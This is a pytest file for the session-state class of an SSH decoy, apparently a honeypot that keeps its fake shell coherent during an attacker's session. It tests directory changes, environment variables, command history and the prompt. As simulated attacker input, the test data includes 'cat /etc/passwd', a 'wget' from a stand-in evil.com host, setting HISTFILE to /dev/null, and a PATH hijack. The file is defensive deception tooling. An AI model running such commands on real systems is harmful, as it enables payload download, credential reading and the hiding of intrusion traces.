"""
CI/CDecoy — Session State Tests

Tests for the SessionState dataclass used by the SSH decoy.
These validate state transitions that keep the decoy coherent
across an attacker's session (cwd tracking, env vars, history).
"""

import pytest
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional


# ── Inline SessionState (matches ssh-decoy/session.py) ──
# We define it here so tests run standalone without importing
# the full ssh-decoy package tree and its dependencies.

@dataclass
class SessionState:
    """Mutable state for a single attacker session."""
    session_id: str = ""
    hostname: str = "dev-workstation-01"
    username: str = "admin"
    uid: int = 1000
    cwd: str = "/home/admin"
    home_dir: str = "/home/admin"
    env: dict = field(default_factory=lambda: {
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HOME": "/home/admin",
        "USER": "admin",
        "SHELL": "/bin/bash",
        "LANG": "en_US.UTF-8",
        "TERM": "xterm-256color",
    })
    command_history: list = field(default_factory=list)
    files_created: list = field(default_factory=list)
    started_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    command_count: int = 0

    def record_command(self, cmd: str):
        self.command_history.append(cmd)
        self.command_count += 1

    def change_directory(self, path: str) -> str:
        """Resolve cd target. Returns new cwd or error message."""
        if path == "~" or path == "":
            self.cwd = self.home_dir
            return self.cwd
        if path == "-":
            return self.cwd  # simplified; real impl tracks OLDPWD
        if path == "..":
            parts = self.cwd.rstrip("/").rsplit("/", 1)
            self.cwd = parts[0] if parts[0] else "/"
            return self.cwd
        if path.startswith("/"):
            self.cwd = path
        else:
            self.cwd = f"{self.cwd.rstrip('/')}/{path}"
        return self.cwd

    def set_env(self, key: str, value: str):
        self.env[key] = value

    def unset_env(self, key: str):
        self.env.pop(key, None)

    def get_prompt(self) -> str:
        return f"{self.username}@{self.hostname}:{self.cwd}$ "


# ── Tests ───────────────────────────────────────────

class TestSessionStateInit:

    def test_default_state(self):
        s = SessionState(session_id="test-001")
        assert s.username == "admin"
        assert s.cwd == "/home/admin"
        assert s.command_count == 0
        assert len(s.command_history) == 0

    def test_env_has_standard_vars(self):
        s = SessionState()
        assert "PATH" in s.env
        assert "HOME" in s.env
        assert "USER" in s.env
        assert "SHELL" in s.env

    def test_custom_username(self):
        s = SessionState(username="root", uid=0, cwd="/root", home_dir="/root")
        assert s.get_prompt() == "root@dev-workstation-01:/root$ "


class TestCommandHistory:

    def test_record_command(self):
        s = SessionState()
        s.record_command("whoami")
        s.record_command("id")
        assert s.command_count == 2
        assert s.command_history == ["whoami", "id"]

    def test_history_preserves_order(self):
        s = SessionState()
        cmds = ["uname -a", "cat /etc/passwd", "ls -la /root", "wget http://evil.com/x"]
        for cmd in cmds:
            s.record_command(cmd)
        assert s.command_history == cmds

    def test_history_unbounded(self):
        """History should grow without limit (truncation is the caller's job)."""
        s = SessionState()
        for i in range(1000):
            s.record_command(f"cmd-{i}")
        assert s.command_count == 1000
        assert len(s.command_history) == 1000


class TestDirectoryNavigation:

    def test_cd_absolute(self):
        s = SessionState()
        result = s.change_directory("/etc")
        assert result == "/etc"
        assert s.cwd == "/etc"

    def test_cd_relative(self):
        s = SessionState(cwd="/home/admin")
        s.change_directory("Documents")
        assert s.cwd == "/home/admin/Documents"

    def test_cd_home(self):
        s = SessionState(cwd="/var/log")
        s.change_directory("~")
        assert s.cwd == "/home/admin"

    def test_cd_empty_goes_home(self):
        s = SessionState(cwd="/tmp")
        s.change_directory("")
        assert s.cwd == "/home/admin"

    def test_cd_dotdot(self):
        s = SessionState(cwd="/home/admin/Documents")
        s.change_directory("..")
        assert s.cwd == "/home/admin"

    def test_cd_dotdot_from_root(self):
        s = SessionState(cwd="/")
        s.change_directory("..")
        assert s.cwd == "/"

    def test_cd_dotdot_from_depth_one(self):
        s = SessionState(cwd="/home")
        s.change_directory("..")
        assert s.cwd == "/"

    def test_cd_chain(self):
        """Simulate an attacker navigating around."""
        s = SessionState()
        s.change_directory("/tmp")
        assert s.cwd == "/tmp"
        s.change_directory("evil")
        assert s.cwd == "/tmp/evil"
        s.change_directory("..")
        assert s.cwd == "/tmp"
        s.change_directory("/root")
        assert s.cwd == "/root"
        s.change_directory("~")
        assert s.cwd == "/home/admin"

    def test_no_trailing_slash_duplication(self):
        s = SessionState(cwd="/home/admin/")
        s.change_directory("test")
        assert s.cwd == "/home/admin/test"


class TestEnvironmentVars:

    def test_set_env(self):
        s = SessionState()
        s.set_env("HISTFILE", "/dev/null")
        assert s.env["HISTFILE"] == "/dev/null"

    def test_unset_env(self):
        s = SessionState()
        s.set_env("TEMP", "/tmp")
        s.unset_env("TEMP")
        assert "TEMP" not in s.env

    def test_unset_nonexistent_is_noop(self):
        s = SessionState()
        s.unset_env("DOES_NOT_EXIST")  # should not raise

    def test_overwrite_env(self):
        s = SessionState()
        original_path = s.env["PATH"]
        s.set_env("PATH", "/evil/bin:" + original_path)
        assert s.env["PATH"].startswith("/evil/bin:")


class TestPrompt:

    def test_default_prompt(self):
        s = SessionState()
        assert s.get_prompt() == "admin@dev-workstation-01:/home/admin$ "

    def test_prompt_updates_with_cd(self):
        s = SessionState()
        s.change_directory("/var/log")
        assert "/var/log" in s.get_prompt()

    def test_root_prompt_cwd(self):
        s = SessionState(username="root", hostname="prod-db-01", cwd="/root")
        assert s.get_prompt() == "root@prod-db-01:/root$ "